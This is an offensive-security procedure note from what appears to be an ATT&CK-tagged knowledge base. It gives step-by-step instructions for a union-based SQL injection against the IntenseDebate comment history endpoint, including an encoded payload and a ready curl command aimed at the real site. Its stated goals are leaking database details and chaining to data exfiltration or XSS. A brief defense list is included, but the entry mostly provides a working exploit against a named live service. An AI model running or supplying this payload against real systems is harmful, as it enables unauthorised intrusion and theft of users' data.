---
tags:
  - sqli
  - injection
  - web
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-intensedebate-sqli]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:05.463Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 68606bae-ec49-4c17-8b35-25f27575fdbb
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Inject-Union-Based-SQL-Payload

## Summary

This procedure delivers a union-based SQL injection payload into the site ID parameter of the IntenseDebate comment history endpoint, allowing arbitrary query execution to leak database details like the server version.

## Description

The vulnerability stems from unsanitized user input in the SQL query for the site ID, enabling union selects to append results. The payload ' %20union%20select%201,2,@@VERSION%23' matches column count and uses @@VERSION to query MariaDB info. URL encoding (%20 for space, %23 for # comment) bypasses basic filters. Success leaks data; further payloads can extract users or enable XSS.

## Requirements

1. Valid site ID and authenticated session
2. Knowledge of target DB (MariaDB/MySQL)
3. HTTP client like curl or browser

## Defense

Defensive measures and detection strategies:

- Employ prepared statements or ORM for all DB queries
- Implement WAF rules to block SQL keywords in URLs
- Monitor for union/select patterns in access logs and alert on anomalies

## Objectives

1. Execute injected query to union results
2. Leak database version and structure
3. Chain to data exfiltration or XSS

## Instructions

### Step 1: Encode the Payload

**Context**: Prepare the injection string for URL use.

Use 'union select 1,2,@@VERSION#' encoded as %20union%20select%201,2,@@VERSION%23.

> This appends to the site ID without breaking the query.

### Step 2: Inject via URL

**Context**: Send the modified request to trigger the injection.

Execute [[commands/curl-intensedebate-sqli]] with your site ID:

```bash
curl "https://intensedebate.com/commenthistory/$YourSiteId%20union%20select%201,2,@@VERSION%23"
```

> Response includes injected results in the HTML.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques

- None

## Commands Used

- [[commands/curl-intensedebate-sqli]]

## Tools Used

- None

## Tags

- [[sql-injection]]
- [[union-based]]
